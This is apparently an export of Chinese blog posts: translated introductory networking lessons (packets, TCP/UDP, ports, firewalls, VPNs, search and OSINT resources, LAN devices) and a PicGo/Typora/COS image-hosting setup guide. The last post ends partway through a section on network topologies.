[{"content":"数据包和帧 什么是数据包和帧 数据包和帧是小块数据，当它们组合在一起时，会形成较大的信息或消息。但是，它们在 OSI 模型中是两个不同的东西。帧位于第 2 层 - 数据链路层，这意味着没有 IP 地址等信息。将此视为将信封放入信封中并将其寄走。第一个信封将是您邮寄的数据包，但一旦打开，其中的信封仍然存在并包含数据（这是一个帧）。\n这个过程称为封装，我们在 3 号房间中讨论过：OSI 模型 。在这个阶段，可以安全地假设当我们谈论任何 IP 地址时，我们谈论的是数据包。当封装信息被剥离时，我们谈论的是框架本身。\n数据包是在联网设备之间传输数据的一种有效方式，例如任务 1 中介绍的设备。由于这些数据是小块交换的，因此与一次发送大消息相比，整个网络中出现瓶颈的可能性更小。\n例如，从网站加载图像时，此图像不会作为一个整体发送到您的计算机，而是在您的计算机上重建的小块。以下图为例来说明这个过程。猫咪的照片被分成三个包，到达计算机后被重建，形成最终的图像。\n数据包具有不同的结构，具体取决于要发送的数据包的类型。正如我们接下来将要讨论的那样，网络充满了标准和协议，它们充当了一组规则，用于定义如何在设备上处理数据包。互联网上连接了数十亿台设备，如果没有标准化，事情可能会很快崩溃。\n让我们继续我们的 Internet 协议示例。使用此协议的数据包将具有一组标头，其中包含通过网络发送的数据的附加信息。\n一些值得注意的标头包括：\nHeader 页眉 Description 描述 Time to Live 此字段为数据包设置一个到期计时器，如果它从未设法到达主机或逃逸，则不会阻塞您的网络！ Checksum 此字段为 TCP/IP 等协议提供完整性检查。如果更改了任何数据，此值将与预期值不同，因此会损坏。 Source Address 发送 数据包的设备的 IP 地址，以便数据知道要返回到何处。 Destination Address 数据包发送到的设备 IP 地址，以便数据知道下一步要传输到何处。 TCP/IP 三次握手 TCP （或 简称 Transmission Control Protocol）是网络中使用的另一种规则。\n到目前为止，该协议与我们之前在本模块的 3 号房间中讨论的 OSI 模型非常相似。TCP/IP 协议由四层组成，可以说只是 OSI 模型的概括版本。这些层是：\nApplication 应用 Transport 运输 Internet 互联网 Network Interface 网络接口 与 OSI 模型的工作方式非常相似，当数据（或数据包）遍历 TCP 模型时，信息会添加到 TCP 模型的每一层。您可能还记得，这个过程被称为 encapsulation - 这个过程的反面是 decapsulation。\nTCP 的一个定义特征是它是 基于连接的 ，这意味着 TCP 必须在发送数据之前在客户端和充当服务器的 设备之间建立连接 。\n因此，TCP 保证发送的任何数据都将在另一端接收。这个过程被称为 三次握手，我们稍后会讨论。 下表比较了 TCP 的优缺点：\nTCP 的优点 TCP 的缺点 保证数据的完整性。 需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块，必须重新发送。 能够同步两个设备，以防止彼此以错误的顺序被数据淹没。 慢速连接可能会使另一台设备成为瓶颈，因为该连接将始终保留在另一台设备上。 执行更多的流程以实现可靠性 TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多的工作 （计算）。 TCP 数据包包含从封装添加的称为报头的信息的各个部分。让我们解释下表中的一些关键标头：\nHeader 页眉 Description 描述 Source Port 源端口 此值是发送方打开的用于发送 TCP 数据包的端口。此值是随机选择的（从当时尚未使用的 0-65535 端口中）。 Destination Port 目标端口 此值是应用程序或服务在远程主机（接收数据的主机）上运行的端口号;例如，在端口 80 上运行的 Web 服务器。与源端口不同，此值不是随机选择的。 Source IP 源 IP 这是发送数据包的设备的 IP 地址。 Destination IP 目标 IP 这是数据包的目标设备的 IP 地址。 Sequence Number 序列号 当连接发生时，传输的第一条数据被赋予一个随机数。我们将在后面更深入地解释这一点。 Acknowledgement Number 鸣谢编号 为一条数据指定序列号后，下一条数据的编号将具有序列号 + 1。我们还将进一步更深入地解释这一点。 Checksum 校验和 此值提供 TCP 完整性。在记住输出的地方进行数学计算。当接收设备执行数学计算时，如果输出与发送的内容不同，则数据必须损坏。 Data 数据 此标头是存储数据（即正在传输的文件的字节）的位置。 Flag 旗 此标头确定任一设备在握手过程中应如何处理数据包。特定的标志将决定特定的行为，这就是我们将在下面解释的内容。 接下来，我们将继续讨论三方握手 - 该术语用于在两个设备之间建立连接的过程。 三方握手使用一些特殊消息进行通信 - 下表突出显示了主要消息：\n步骤 消息 描述 1 SYN SYN 消息是客户端在握手期间发送的初始数据包。此数据包用于启动连接并将两个设备同步在一起（我们稍后将进一步解释）。 2 SYN/ACK 此数据包由接收设备（服务器）发送，以确认来自客户端的同步尝试。 3 ACK The acknowledgement packet can be used by either the client or server to acknowledge that a series of messages/packets have been successfully received. 客户端或服务器可以使用确认数据包来确认已成功接收一系列消息/数据包。 4 DATA 建立连接后，数据（例如文件的字节）将通过 “DATA” 消息发送。 5 FIN 此数据包用于在连接完成后干净（正确） 关闭连接。 # RST 此数据包会突然结束所有通信。这是最后的手段，表明在此过程中存在一些问题。例如，如果服务或应用程序无法正常工作，或者系统存在资源不足等故障。 下图显示了 Alice 和 Bob 之间的正常 Three-way 握手过程。在现实生活中，这将是在两个设备之间。\n任何发送的数据都会被赋予一个随机数字序列，并使用此数字序列并以 1 为增量进行重建。两台计算机必须就相同的编号规则达成一致，才能以正确的顺序发送数据。此顺序分三个步骤达成一致：\nSYN - 客户端：这是我的初始序列号 （ISN），用于 SYNchronise （0） SYN/ACK - 服务器：这是我用 （5,000） 记录 SYN 的初始序列号 （ISN），我现在确认您的初始编号序列 （0） ACK - 客户端：我确认您的初始序列号 （ISN） 为 （5,000），下面是我的 ISN+1 （0 + 1） 的一些数据 Device 初始编号序列 （ISN） 最终编号序列 客户端 （发件人） 0 0 + 1 = 1 客户端 （发件人） 1 1 + 1 = 2 客户端 （发件人） 2 2 + 1 = 3 TCP 协议关闭连接：\n让我们快速解释一下 TCP 关闭连接背后的过程。首先， 一旦设备确定另一台设备已成功接收所有数据，TCP 将关闭连接。\n由于 TCP 会在设备上保留系统资源，因此最佳做法是尽快关闭 TCP 连接。\n要启动关闭 TCP 连接，设备将向另一台设备发送 “FIN” 数据包。当然，使用 TCP 时，另一台设备也必须确认此数据包。\n让我们像以前一样使用 Alice 和 Bob 来演示这个过程。\n在图中，我们可以看到 Alice 向 Bob 发送了一个 “FIN” 数据包。因为 Bob 收到了这个，所以他会让 Alice 知道他收到了这个，并且他还想关闭连接（使用 FIN）。Alice 已经清楚地听到了 Bob 的声音，并会让 Bob 知道她承认了这一点。\nUDP/IP 协议 User Datagram Protocol （UDP） 是另一种用于在设备之间传输数据的协议。\n与其兄弟 TCP 不同，UDP 是一种 无 状态协议，不需要两个设备之间持续连接即可发送数据。例如，不会发生 Three-way hand shake，两个设备之间也没有任何同步。\n回想一下 3 号房间中对这两个协议所做的一些比较：“OSI 模型”。也就是说，UDP 用于应用程序可以容忍数据丢失的情况（例如视频流或语音聊天）或不稳定的连接不是最终结果的情况。下表比较了 UDP 的优缺点：\nUDP 的优势 UDP 的缺点 UDP 比 TCP 快得多。 UDP 不关心数据是否被接收。 UDP 让应用程序（用户软件）决定是否可以控制数据包的发送速度。 从这个意义上说，它对软件开发人员来说是相当灵活的。 UDP 不会像 TCP 那样在设备上保留连续连接。 这意味着不稳定的连接会给用户带来糟糕的体验。 如前所述，在两个设备之间建立连接时不会发生任何过程。这意味着不考虑是否接收数据，也没有像 TCP 提供的保护措施，例如数据完整性。\nUDP 数据包比 TCP 数据包简单得多，并且标头更少。但是，这两种协议共享一些标准标头，下表中对此进行了注释：\nHeader 页眉 描述 Time to Live (TTL) 生存时间 （TTL） 此字段为数据包设置到期计时器，因此如果数据包从未成功到达主机或逃逸，它不会阻塞您的网络！ Source Address 源地址 发送数据包的设备的 IP 地址，以便数据知道要返回到何处。 Destination Address 目标地址 数据包发送到的设备 IP 地址，以便数据知道下一步要传输到何处。 Source Port 源端口 此值是发送方打开的端口，用于发送 UDP 数据包。此值是随机选择的（从当时尚未使用的 0-65535 端口中）。 Destination Port 目标端口 此值是应用程序或服务在远程主机（接收数据的主机）上运行的端口号;例如，在端口 80 上运行的 Web 服务器。与源端口不同，此值不是随机选择的。 Data 数据 此标头是存储数据（即正在传输的文件的字节）的位置。 接下来，我们将继续讨论通过 UDP 进行连接的过程与 TCP 等过程有何不同。 我们应该记住 UDP 是无状态的。连接期间不会发送确认。\n下图显示了 Alice 和 Bob 之间的正常 UDP 连接。在现实生活中，这将是在两个设备之间。\n端口 也许正如他们的名字一样，端口是可以交换数据的重要点。想想港口和港口。希望停靠港口的船舶必须前往与船上的尺寸和设施相适应的港口。当船只排队时，它将连接到港口的港口 。例如，邮轮不能停靠在为渔船建造的港口，反之亦然。\n这些端口强制规定了什么可以停放以及停在哪里——如果不兼容，它就不能停在这里。网络设备在相互通信时也使用端口来执行严格的规则。建立连接后（从 OSI 模型的房间调用），设备发送或接收的任何数据都将通过这些端口发送。在计算中，端口是介于 0 和 65535 （65,535） 之间的 数值 。\n由于端口的范围可以在 0 到 65535 之间的任何位置，因此很快就会忘记哪个应用程序正在使用哪个端口。繁忙的港口一片混乱！值得庆幸的是，我们将应用程序、软件和行为与一组标准规则相关联。例如，通过强制通过端口 80 发送任何 Web 浏览器数据，软件开发人员可以设计一个 Web 浏览器（如 Google Chrome 或 Firefox）来以相同的方式解释数据。\n这意味着所有 Web 浏览器现在都共享一个通用规则：数据通过端口 80 发送。浏览器的外观、感觉和易用性取决于设计师或用户的决定。\n虽然 Web 数据的标准规则是 端口 80，但已为其他一些协议分配了标准规则。介于 0 和 1024 （1,024） 之间的 任何端口都称为公共端口。 让我们在下面探索一些其他协议：\nProtocol 协议 端口号 描述 File Transfer Protocol (FTP) 21 此协议由基于客户端-服务器模型构建的文件共享应用程序使用，这意味着您可以从中心位置下载文件。 Secure Shell (SSH) 22 该协议用于通过基于文本的界面安全地登录系统以进行管理。 HyperText Transfer Protocol (HTTP) 80 该协议为万维网 （WWW） 提供支持！您的浏览器使用它来下载网页的文本、图像和视频。 HyperText Transfer Protocol Secure (HTTPS) 443 该协议的作用与上述完全相同;但是，安全地使用加密。 Server Message Block (SMB) 445 此协议类似于文件传输协议 （FTP）;但是，除了文件之外，SMB 还允许您共享打印机等设备。 Remote Desktop Protocol (RDP) 3389 此协议是一种使用可视化桌面界面登录系统的安全方法（与 SSH 协议的基于文本的限制相反）。 我们只简要介绍了网络安全中更常见的协议。有关更多信息，您可以找到列出的 1024 个常用端口的表 。\n这里值得注意的是，这些协议只遵循标准。即，您可以在标准端口以外的其他端口（在 8080 而不是 80 标准端口上运行 Web 服务器）上管理与这些协议交互的应用程序。但请注意，应用程序将假定遵循标准，因此您必须提供冒号 （:) 以及端口号。\n","date":"2025-03-24T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-9239059_1280.jpg","permalink":"https://Yerucrem.github.io/p/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%92%8C%E5%B8%A7/","title":"数据包和帧"},{"content":"搜索技巧 搜索引擎 我们每个人都使用过互联网搜索引擎;但是，并不是每个人都尝试利用 Internet 搜索引擎的全部功能。几乎每个 Internet 搜索引擎都允许您进行高级搜索。请考虑以下示例：\nGoogle 谷歌 Bing 必应 DuckDuckGo 鸭鸭 Go 让我们考虑一下 Google 支持的搜索运算符。\n\u0026quot;exact phrase\u0026quot;：双引号表示您正在查找包含确切单词或短语的页面。例如，人们可能会搜索 “passive reconnaissance” 来获取包含此确切短语的页面。 site:： 此运算符允许您指定要将搜索限制到的域名。例如，我们可以使用 在 TryHackMe 上搜索 site:tryhackme.com success stories 成功案例。 -：减号允许您省略包含特定单词或短语的搜索结果。例如，您可能对了解金字塔感兴趣，但不想查看旅游网站;一种方法是搜索 pyramids -tourism 或 -tourism pyramids。 filetype:： 此搜索运算符对于查找文件而不是网页是必不可少的。您可以使用 Google 搜索的一些文件类型是可移植文档格式 （PDF）、Microsoft Word 文档 （DOC）、Microsoft Excel 电子表格 （XLS） 和 Microsoft PowerPoint 演示文稿 （PPT）。例如，要查找网络安全演示文稿，请尝试搜索 filetype：ppt cyber security。 您可以在此高级搜索运算符列表中查看各种搜索引擎中的更高级控件;但是，以上提供了一个很好的起点。检查您最喜欢的搜索引擎，了解支持的搜索运算符。\n专业搜索引擎 您熟悉 Internet 搜索引擎;但是，您对专业搜索引擎熟悉多少？我们指的是用于查找特定类型结果的搜索引擎。\nShodan 让我们从 Shodan 开始，这是一个用于连接到 Internet 的设备的搜索引擎。它允许您搜索特定类型和版本的服务器、网络设备、工业控制系统和 IoT 设备。您可能希望查看仍有多少服务器仍在运行 Apache 2.4.1 以及各个国家/地区的分布情况。要找到答案，我们可以搜索 apache 2.4.1，它将返回标头中包含字符串“apache 2.4.1”的服务器列表。\n考虑访问 Shodan Search Query Examples 了解更多示例。此外，如果您有订阅，您可以查看 Shodan 趋势以获取历史见解。\nCensys 乍一看，Censys 似乎与 Shodan 相似。但是，Shodan 专注于连接互联网的设备和系统，例如服务器、路由器、网络摄像头和 IoT 设备。另一方面，Censys 专注于连接 Internet 的主机、网站、证书和其他 Internet 资产。它的一些用例包括枚举正在使用的域、审计开放端口和服务以及发现网络中的流氓资产。您可能需要检查 Censys Search Use Cases。\nVirusTotal VirusTotal 是一个在线网站，它使用多个防病毒引擎为文件提供病毒扫描服务。它允许用户上传文件或提供 URL，以便在一次作中针对众多防病毒引擎和网站扫描程序对其进行扫描。他们甚至可以输入文件哈希值来检查以前上传的文件的结果。\n下面的屏幕截图显示了根据 67 个防病毒引擎检查提交的文件的结果。此外，您可以查看社区的评论以获得更多见解。有时，文件可能会被标记为病毒或特洛伊木马程序;但是，由于各种原因，这可能不准确，这时社区成员可以提供更深入的解释。\nHave I Been Pwned Have I Been Pwned （HIBP） 只做一件事;它会告诉您电子邮件地址是否出现在数据泄露事件中。在泄露的数据中找到一个人的电子邮件表明私人信息泄露，更重要的是，密码泄露。许多用户在多个平台上使用相同的密码，如果一个平台被泄露，他们在其他平台上的密码也会暴露。事实上，密码通常以加密格式存储;但是，许多密码并不那么复杂，可以使用各种攻击来恢复。\n漏洞和漏洞利用 CVE 漏洞 我们可以将 Common Vulnerabilities and Exposures （CVE） 程序视为漏洞字典。它为软件和硬件产品中的漏洞和安全问题提供标准化标识符。每个漏洞都分配有一个采用标准化格式（如 CVE-2024-29988）的 CVE ID。此唯一标识符 （CVE ID） 可确保从安全研究人员到供应商和 IT 专业人员的每个人都引用相同的漏洞，在本例中为 CVE-2024-29988。\nMITRE Corporation 维护 CVE 系统。有关更多信息和搜索现有 CVE，请访问 CVE 计划 Web 站点。或者，访问国家漏洞数据库 （NVD） 网站。下面的屏幕截图显示了 CVE-2014-0160，也称为 Heartbleed。\n漏洞利用数据库 您想要利用易受攻击的应用程序的原因有很多;一种是将公司的安全性作为其红队的一部分进行评估。不用说，除非我们得到许可，否则我们不应该试图利用易受攻击的系统，通常是通过具有法律约束力的协议。\n现在我们有权利用易受攻击的系统，我们可能需要找到一个有效的漏洞利用代码。一种资源是 Exploit Database。漏洞利用数据库列出了来自不同作者的漏洞利用代码;其中一些漏洞利用代码已经过测试并标记为已验证。\nGitHub 是一个基于 Web 的软件开发平台，可以包含许多与 CVE 相关的工具，以及概念验证 （PoC） 和漏洞利用代码。要演示此想法，请查看下面的 GitHub 上与 Heartbleed 漏洞相关的搜索结果的屏幕截图。\n技术文档 需要获得的一项重要技能是查找官方文件。我们将介绍一些官方文档页面的示例。\nLinux 的手册页 早在 Internet 无处不在之前，您如何在 Linux 或类似 Unix 的系统中使用命令获得帮助？答案是检查手册页，简称手册页。在 Linux 和每个类 Unix 系统上，每个命令都应该有一个手册页。事实上，还存在用于系统调用、库函数甚至配置文件的手册页。\n假设我们想检查命令 ip 的手册页。我们发出命令 man ip。下面的屏幕截图显示了我们收到的页面。您可能希望启动 AttackBox 并在终端上运行 man ip。按 q 退出。\n如果您更喜欢在 Web 浏览器中阅读 ip 的手册页，只需在您最喜欢的搜索引擎中输入 man ip 即可。 此页面可能位于结果的顶部。\nMicrosoft Windows Microsoft 为其产品提供了官方技术文档页面。下面的屏幕截图显示了命令 ipconfig 的搜索结果。\n产品文档 每个流行的产品都应该有组织良好的文档。本文档提供了有关产品特性和功能的官方可靠信息来源。示例包括 Snort 官方文档 、Apache HTTP 服务器文档 、PHP 文档和 Node.js 文档 。\n查看官方文档总是有益的，因为它是最新的并提供最完整的产品信息。\n社交媒体 有数十亿用户在 Facebook、Twitter 和 LinkedIn 等社交媒体平台上注册。我们希望您熟悉流行的平台。但是，如果您知道任何不熟悉的平台，我们建议您查看并了解它。理想情况下，人们希望在不创建帐户的情况下探索平台;但是，这会严重限制您的体验。相反，一个建议是使用临时电子邮件地址来发现这些平台，而无需将它们链接到您的真实电子邮件地址;完成后，您可以终止账户和关联的电子邮件地址。不使用您的主要帐户的一个原因是，当您只是暂时探索平台时，您不希望您的联系人开始在那里与您联系。\n社交媒体的力量在于它可以让您与您感兴趣的公司和人建立联系。此外，社交媒体为网络安全专业人士提供了丰富的信息，无论他们是搜索人员还是技术信息。你会问为什么搜索人很重要？\n在保护公司时，您应该确保您保护的人不会在社交媒体上过度分享。例如，他们的社交媒体可能会泄露他们秘密问题的答案，例如，“你小时候上过哪所学校？此类信息可能允许攻击者重置其密码并轻松接管其帐户。\n此外，作为网络安全专业人士，您希望随时了解新的网络安全趋势、技术和产品。遵循适当的渠道和小组可以为增长您的技术专业知识提供合适的环境。\n除了通过社交媒体渠道和群组保持更新外，我们还应该提及新闻媒体。数百个新闻网站将提供有价值的网络安全相关新闻。尝试不同的，并坚持你最喜欢的。\n","date":"2025-03-24T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/ai-generated-9438277.jpg","permalink":"https://Yerucrem.github.io/p/%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/","title":"搜索技巧"},{"content":"网络扩展 端口转发 端口转发是将应用程序和服务连接到 Internet 的重要组件。如果没有端口转发，应用程序和服务（如 Web 服务器）只能用于同一直接网络内的设备。\n以下面的网络为例。在此网络中，IP 地址为“192.168.1.10”的服务器在端口 80 上运行 Web 服务器。只有此网络上的其他两台计算机能够访问它（这称为 Intranet）。\n如果管理员希望公众可以访问网站（使用 Internet），则必须实施端口转发，如下图所示：\n通过这种设计，网络 #2 现在将能够使用网络 #1 的公共 IP 地址 （82.62.51.70） 访问在网络 #1 上运行的 Web 服务器。\n很容易将端口转发与防火墙的行为混淆（我们将在后面的任务中讨论这项技术）。但是，在这个阶段，只需了解端口转发会打开特定端口（回想一下数据包的工作原理）。相比之下，防火墙确定流量是否可以通过这些端口传输（即使这些端口通过端口转发打开）。\n端口转发在网络的路由器上配置。\n防火墙基础 防火墙是网络中负责确定允许哪些流量进出的设备。将防火墙视为网络的边界安全。管理员可以根据多种因素配置防火墙以允许 或 拒绝 流量进入或退出网络，例如：\n流量来自哪里？（是否告知防火墙接受/拒绝来自特定网络的流量？） 流量去哪里了？（是否告知防火墙接受/拒绝发往特定网络的流量？） 流量用于哪个端口？（是否已告知防火墙仅接受/拒绝发往端口 80 的流量？） 流量使用什么协议？（是否告知防火墙接受/拒绝 UDP、TCP 或两者兼而有之的流量？） 防火墙执行数据包检查以确定这些问题的答案。\n防火墙有各种形状和大小。从可以处理大量数据的专用硬件（通常位于企业等大型网络中）到住宅路由器（如您家中）或 Snort 等软件，防火墙可分为 2 到 5 类。\n我们将在下表中介绍防火墙的两大主要类别：\n防火墙类别 描述 Stateful 状态 这种类型的防火墙使用来自连接的全部信息;此防火墙不是检查单个数据包，而是根据整个连接确定设备的行为。与无状态防火墙相比，这种防火墙类型会消耗许多资源，因为决策是动态的。例如， 防火墙可能允许 TCP 握手的第一部分，但稍后会失败。如果来自主机的连接错误，它将阻止整个设备。 Stateless 无状态 此防火墙类型使用一组静态规则来确定单个数据包是否可接受。例如，发送错误数据包的设备并不一定意味着整个设备随后被阻止。虽然这些防火墙使用的资源比其他防火墙少得多，但它们要笨得多。例如，这些防火墙仅对其中定义的规则有效。如果规则不完全匹配，它实际上就毫无用处。 但是，当从一组主机接收大量流量（例如分布式拒绝服务攻击）时，这些防火墙非常有用 防火墙练习 恶意流量被标记为红色数据包。合法流量是标记为绿色的数据包。您需要阻止的协议是端口 80。 配置防火墙 ，防止恶意数据包到达 Web 服务器 203.0.110.1。\nVPN基础知识 A Virtual Private Network（或 简称 VPN ）是一种技术，它允许不同网络上的设备通过通过 Internet 在彼此之间创建专用路径（称为隧道）来安全地通信。在此隧道中连接的设备将形成自己的专用网络。\n例如，只有同一网络（例如企业内部）内的设备才能直接通信。但是，VPN 允许连接两个办公室。让我们看下图，其中有三个网络：\nNetwork #1 (Office #1) Network #2 (Office #2) Network #3 （通过 VPN 连接的两台设备） 连接在网络 #3 上的设备仍然是网络 #1 和网络 #2 的一部分，但也共同形成一个专用网络（网络 #3），只有通过此 VPN 连接的设备才能通过该网络进行通信。\n让我们在下表中介绍 VPN 提供的其他一些好处：\n效益 描述 允许连接不同地理位置的网络。 例如，拥有多个办事处的企业会发现 VPN 是有益的，因为这意味着可以从另一个办公室访问服务器/基础设施等资源。 提供隐私。 VPN 技术使用加密来保护数据。这意味着它只能在发送它的设备和目的地之间被理解，这意味着数据不易被嗅探。这种加密在网络不提供加密的公共 WiFi 的地方很有用。您可以使用 VPN 来保护您的流量不被其他人查看。 提供匿名 记者和活动家依靠 VPN 在言论自由受到控制的国家/地区安全地报道全球问题。通常，您的 ISP 和其他中介可以查看您的流量，因此可以对其进行跟踪。VPN 提供的匿名性级别仅与网络上其他设备尊重隐私的方式一样多。例如，在这方面，记录您所有数据/历史记录的 VPN 与不使用 VPN 本质上相同。 TryHackMe 使用 VPN 将您连接到我们易受攻击的机器，而无需在 Internet 上直接访问它们！这意味着：\n您可以安全地与我们的机器交互 服务提供商（如 ISP）不会认为您正在攻击 Internet 上的另一台计算机（这可能违反服务条款） VPN 为 TryHackMe 提供安全性，因为无法使用 Internet 访问易受攻击的机器。 VPN 技术多年来一直在改进。让我们在下面探索一些现有的 VPN 技术：\n**VPN Technology ** 描述 PPP PPTP 使用此技术（如下所述）来允许身份验证并提供数据加密。VPN 通过使用私钥和公有证书（类似于 SSH）来工作。私钥和证书必须匹配才能连接。该技术无法自行离开网络（不可路由）。 PPTP （PPTP） 是允许来自 PPP 的数据传输和离开网络的技术。PPTP 非常易于设置，并且大多数设备都支持。但是，与其他选择相比，它的加密较弱。 IPSec 协议安全 （IPsec） 使用现有的 Internet Protocol （IP） 框架对数据进行加密。与其他选择相比，IPSec 很难设置;但是，如果成功，它拥有强大的加密功能，并且许多设备也支持它。 LAN 联网设备 什么是路由器 路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）\n路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。路由器在 OSI 模型的第 3 层运行。它们通常具有交互式界面（例如网站或控制台），允许管理员配置各种规则，例如端口转发或防火墙。\n当设备通过许多路径连接时，路由非常有用，例如在下面的示例图中，其中采用最佳路径：\n路由器是专用设备，不执行与交换机相同的功能。\n我们可以看到，计算机 A 的网络通过中间的两个路由器连接到计算机 B 的网络。问题是：将采取什么道路？不同的协议将决定应该采取什么路径，但因素包括：\n最短的路径是什么？ 什么路径最可靠？ 哪条路径具有更快的介质（例如铜缆或光纤）？ 什么是交换机 交换机是一种专用网络设备，负责提供连接到多个设备的方法。交换机可以使用以太网电缆为许多设备（从 3 到 63 个）提供服务。\n交换机可以在 OSI 模型的第 2 层和第 3 层运行。但是，这些是排他性的，因为第 2 层交换机不能在第 3 层运行。\n以下图中的第 2 层交换机为例。这些交换机将使用帧的 MAC 地址将帧（请记住，这些不再是数据包，因为 IP 协议已被剥离）转发到连接的设备上。\n这些交换机仅负责将帧发送到正确的设备。\n现在，让我们来看看第 3 层交换机。这些交换机比第 2 层更复杂，因为它们可以执行 路由器的一些职责。也就是说，这些交换机将帧发送到设备（就像第 2 层一样），并使用 IP 协议将数据包路由到其他设备。\n让我们看一下下图中的第 3 层交换机。我们可以看到有两个 IP 地址：\n192.168.1.1 192.168.2.1 一种称为 VLAN （Virtual Local Area Network） 的技术允许对网络内的特定设备进行虚拟拆分。这种拆分意味着他们都可以从 Internet 连接等中受益，但被单独处理。这种网络分离提供了安全性，因为这意味着现有的规则决定了特定设备如何相互通信。这种分离如下图所示：\n在上图的上下文中，“销售部门”和“会计部门”将能够访问 Internet，但无法相互通信（尽管它们连接到同一交换机）。\n","date":"2025-03-24T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/waves-8905720.png","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%89%A9%E5%B1%95/","title":"网络扩展"},{"content":"图床服务搭建过程 简介 图床服务提供图片存储、图片加工处理、图片全网分发等功能，为全球无数的博客网站和社区论坛提供了后端图片服务支撑。开发者们可以使用腾讯云**对象存储（Cloud Object Storage，COS）**搭建图床服务，COS 是腾讯云提供的一种存储海量文件的分布式存储服务，提供了更丰富的功能、更优越的性能、更高的可靠性保障。\nCOS 用于图床场景的优势有：\n**低成本：**存储单价低，按量付费，用多少算多少，还有资源包优惠。 **不限速：**上传下载不限速，不再长时间等待 loading，访问质量也更好。 **高可用：**有高等级的 SLA 可用性保障，存储的数据有高达99.9999999999%的持久性保障。 **容量无限：**文件分布式存储，支持海量文件，容量按需使用。 实践场景 场景一：新增图片使用 COS 搭建图床服务 本场景使用到以下工具：\n﻿PicGo：一款支持多种云存储配置、快捷生成图片链接的工具。\n﻿Typora：一款轻量级 Markdown 编辑器，支持多种输出格式，支持将本地图片一键上传至图床。\n操作步骤 步骤一 安装 PicGo 并设置腾讯云 COS 服务相关参数。\n在 PicGo 官网 下载和安装 PicGo 后，在图床设置里找到腾讯云 COS，并配置以下相关参数项：\nCOS 版本：选择 COS v5。\n设定 Secretld：开发者拥有的项目身份识别 ID，用于身份认证，可在 API 密钥管理 页面中创建和获取。\n设定 SecretKey：开发者拥有的项目身份密钥，可在 API 密钥管理 页面获取。\n设定 Bucket：存储桶，COS 中用于存储数据的容器。有关存储桶的进一步说明，请参见 存储桶概述 文档。\n设定 AppId：开发者访问 COS 服务时拥有的用户维度唯一资源标识，用以标识资源，可在 API 密钥管理 页面获取。\n设定存储区域：存储桶所属地域信息，枚举值可参见 可用地域 文档，例如 ap-beijing、ap-hongkong、eu-frankfurt 等。\n设定存储路径：图片存放到 COS 存储桶中的路径。\n设定自定义域名：可选，若您为上方的存储空间配置了自定义源站域名，则可填写。相关介绍可参见 开启自定义源站域名。\n设定网址后缀：通过在网址后缀添加 COS 数据处理参数实现图片压缩、裁剪、格式转换等操作，相关介绍可参见 图片处理。\n步骤二 设置 typora（可选）\n设置指引如下：\n2.1 在 typora 的偏好设置的图像中，进行如下配置：\n2.2 重启 typora，使设置生效。\n2.3 进入 typora 编辑器区域，直接拖放或粘贴图片，即可上传图片并自动替换为 COS 文件链接。（如果粘贴后没有自动替换为 COS 链接，可以检查 PicGo 中的 server 设置是否已打开）。\n场景二：将原图床仓库图片快速迁移到腾讯云 COS 以某图床服务举例，您可以找到本地图床文件夹，或从线上下载完整文件夹，并将文件夹中所有图片转存到 COS 存储桶。最后再统一替换链接域名即可恢复网站。\n操作步骤 下载原图床服务的图片。 登录原图床网站页面，下载此前已上传的图片文件夹。\n创建 COS 存储桶并设置防盗链。 2.1 注册腾讯云账号，创建一个访问权限为公有读私有写的存储桶，操作指引请参见 创建存储桶。\n2.2 创建存储桶后，在存储桶里打开防盗链设置，避免图片被盗刷，操作指引请参见 设置防盗链。\n上传文件夹到存储桶。 在刚才已创建的存储桶里，单击上传文件夹，将刚才准备好的图片文件夹，上传到 COS 存储桶。操作指引请参见 上传对象。\n全局替换链接域名 在 COS 控制台存储桶概览页，复制存储桶默认域名（也可以绑定自定义 CDN 加速域名）。使用常用代码编辑器，对项目全局搜索替换失效链接前缀为 COS 存储桶默认域名。\nvscode 搜索替换示例：\nsublime text 搜索替换示例：\n","date":"2025-03-20T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background04.jpg","permalink":"https://Yerucrem.github.io/p/%E4%BD%BF%E7%94%A8-picgo-typora-cos-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A%E6%9C%8D%E5%8A%A1/","title":"使用 PicGo+Typora+COS 搭建图床服务"},{"content":"网络基础 LAN简介 多年来，已经对各种网络设计进行了实验和实施。对于网络，当我们提到术语 “拓扑” 时，我们实际上指的是手头网络的设计或外观。下面我们来讨论一下这些拓扑的优缺点。\n星形拓扑 星形拓扑的主要前提是设备通过中央网络设备（如交换机或集线器）单独连接。这种拓扑是当今最常见的拓扑，因为它具有可靠性和可扩展性 - 尽管成本高昂。\n发送到此拓扑中设备的任何信息都通过它所连接的中央设备发送。让我们在下面探讨一下这种拓扑的一些优点和缺点：\n由于此拓扑需要更多的布线和购买专用网络设备，因此它比任何其他拓扑都更昂贵。然而，尽管成本增加，但这确实提供了一些显着的优势。例如，这种拓扑本质上更具可扩展性，这意味着随着网络需求的增加，很容易添加更多设备。\n遗憾的是，网络规模越大，保持网络正常运行所需的维护就越多。这种对维护的依赖增加也会使故障排除变得更加困难。此外，星形拓扑结构仍然容易出现故障 - 尽管有所减少。例如，如果连接设备的集中式硬件发生故障，这些设备将无法再发送或接收数据。值得庆幸的是，这些集中式硬件设备通常很强大。\n总线拓扑 